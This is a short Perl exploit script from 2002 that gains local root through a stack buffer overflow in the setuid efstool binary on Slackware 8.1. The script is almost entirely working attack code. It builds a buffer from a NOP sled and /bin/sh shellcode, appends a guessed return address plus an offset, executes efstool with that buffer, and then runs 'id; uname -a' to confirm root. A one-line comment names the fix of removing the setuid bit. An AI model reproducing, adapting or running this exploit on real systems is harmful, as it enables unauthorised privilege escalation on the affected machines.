#!/usr/bin/perl
# Efstool local root exploits (Slackware 8.1)
# Author: ntfx <ntfx@legion2000.tk> Feb 13th 2002
# Legion2000 Security Research (c)
# Soldierx Dot Com
# WEB: HTTP://legion2000.security.nu
# WEB: HTTP://soldierx.com
# GREET: Legion2000SR, Soldierx.com, Kat
############################################
# Solution: chmod u-s efstool
############################################
if(! $ARGV[0])
	{
 	&usage;
 	exit;
 }

sub usage() {
	print "USAGE: perl $0 <offset> kat\n";
	print "efstool local root by ntfx\n";
	print "Legion2000SR http://legion2000.security.nu\n";
	print "Soldierx	  http://soldierx.com\n";
      exit(0); 
}

$ret 	    = "0xbfffe890";
$offset   = $ARGV[0];
$nop 	    = "\x90";
$ev1lc0de = "\xeb\x1d\x5e\x29\xc0\x88\x46\x07\x89".
	      "\x46\x0c\x89\x76\x08\xb0\x0b\x87\xf3".
            "\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\x29".
            "\xc0\x40\xcd\x80\xe8\xde\xff\xff\xff".
            "/bin/sh";

	if ($ARGV[1] eq "kat") {
        	$len = 3000;
        	for ($i = 0; $i < ($len - length($ev1lc0de)); $i++) {
                	$buffer .= $nop;
        	}
        	$buffer .= $ev1lc0de;
	} 
$buffer .= pack('l', ($ret + $offset));
$buffer .= pack('l', ($ret + $offset));

# You will now be privilaged..
exec("/usr/bin/efstool $buffer");
sleep 2;
system("id; uname -a");
# This has been a SoldierX/Legion2000 Production

